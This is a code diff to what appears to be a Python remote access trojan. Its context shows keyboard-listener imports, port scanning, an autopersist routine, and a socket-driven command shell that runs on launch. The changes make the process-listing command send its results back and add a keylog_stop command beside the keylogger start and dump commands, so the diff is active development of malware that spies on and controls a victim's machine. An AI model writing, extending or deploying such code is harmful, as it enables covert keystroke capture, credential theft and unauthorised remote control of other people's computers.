@@ -15,7 +15,8 @@ import getpass
 import ctypes
 from pynput.keyboard import Listener
 import time
-
+import uuid
+import re
 import sqlite3
 import base64
 from urllib.request import Request, urlopen
@@ -27,6 +28,11 @@ import psutil
 import urllib.request as urllib2
 import platform
 import struct
+
+
+
+
+
 
 def scanport(ip,port):
 
@@ -117,7 +123,8 @@ def getprocess():
         if processPath == "":
             processPath = "-"
         buffer += processName + '###' + str(processID) + '###' + processPath + '\n'
-    reliable_send(buffer)
+    return  buffer
+
 
 def autopersist():
 
@@ -681,7 +688,7 @@ def shell():
                 reliable_send('[-]ERROR')
         elif command[:6] == 'pslist':
             try:
-                getprocess()
+                reliable_send(getprocess())
             except:
                 reliable_send('[-]ERROR')
         elif command[:3] == 'say':
@@ -747,6 +754,8 @@ def shell():
                 continue
         elif command[:12] == 'keylog_start':
             try:
+                global t
+                global keylog
                 reliable_send('Starting keylogger')
                 keylog = Keylogger()
                 t = threading.Thread(target=keylog.start)
@@ -754,6 +763,15 @@ def shell():
 
             except:
                 reliable_send('[-]ERROR')
+
+                continue
+        elif command[:11] == 'keylog_stop':
+            try:
+                keylog.self_destruct()
+                t.join()
+                reliable_send('[+] Keylogger Stopped!')
+            except:
+                reliable_send('[-] keylogger not started')
                 continue
         elif command[:11] == 'keylog_dump':
             try:
@@ -819,5 +837,7 @@ def shell():
             reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
 autopersist()
 connection()
